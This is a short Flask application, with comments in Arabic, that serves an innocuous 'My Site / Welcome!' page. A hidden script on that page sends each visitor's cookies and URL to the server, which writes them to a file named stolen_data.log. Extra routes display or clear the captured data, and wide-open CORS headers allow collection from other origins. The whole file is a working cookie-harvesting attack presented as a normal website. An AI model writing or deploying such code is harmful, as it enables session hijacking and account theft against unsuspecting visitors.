from flask import Flask, request, jsonify, send_file
import datetime
import os

app = Flask(__name__)

# ✅ إضافة CORS headers
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>My Site</title>
    </head>
    <body>
        <h1>Welcome!</h1>
        <script>
            fetch('/log', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    cookies: document.cookie,
                    url: location.href
                })
            });
        </script>
    </body>
    </html>
    '''

@app.route('/log', methods=['POST', 'OPTIONS'])
def log_data():
    if request.method == 'OPTIONS':
        return '', 200
    
    data = request.json
    print('🎯 NEW DATA:', data)
    
    # ✅ حفظ البيانات في ملف (استخدم /tmp/ لـ Render)
    log_file = '/tmp/stolen_data.log'
    with open(log_file, 'a') as f:
        f.write(f"{datetime.datetime.now()} - {data}\\n")
    
    return jsonify({'status': 'success', 'received': True})

@app.route('/logs')
def view_logs():
    '''عرض البيانات المسجلة'''
    try:
        log_file = '/tmp/stolen_data.log'
        with open(log_file, 'r') as f:
            logs = f.read()
        return f'<pre>{logs}</pre>'
    except Exception as e:
        return f'No logs yet or error: {e}'

@app.route('/clear')
def clear_logs():
    '''مسح البيانات'''
    try:
        log_file = '/tmp/stolen_data.log'
        if os.path.exists(log_file):
            os.remove(log_file)
        return 'Logs cleared!'
    except:
        return 'Error clearing logs'

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
